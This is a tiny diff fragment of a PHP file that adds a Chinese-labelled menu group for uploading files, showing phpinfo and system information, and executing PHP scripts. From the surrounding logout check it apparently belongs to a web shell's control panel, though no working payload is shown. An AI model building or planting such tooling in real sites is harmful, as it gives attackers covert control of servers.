@@ -62,3 +62,4 @@ if($eanver == 'logout'){
 }
 
 $class = array(
+"信息操作" => array("upfiles" => "上传文件","phpinfo" => "基本信息","info_f" => "系统信息","phpcode" => "执行PHP脚本"),
